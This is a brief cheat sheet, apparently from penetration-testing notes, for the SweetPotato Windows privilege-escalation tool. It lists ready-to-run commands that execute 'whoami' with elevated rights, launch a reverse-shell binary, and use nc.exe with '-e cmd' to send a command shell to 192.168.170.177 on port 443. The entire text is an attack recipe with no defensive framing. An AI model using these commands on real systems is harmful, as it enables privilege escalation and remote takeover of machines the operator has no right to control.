
## Command Execution

```
.\SweetPotato.exe -a "whoami"
```
## RCE

Running an reverse shell

```
.\SweetPotato.exe -p .\shell.exe
```

Running nc.exe

```
.\SweetPotato.exe -p .\nc.exe -a "-e cmd 192.168.170.177 443"
```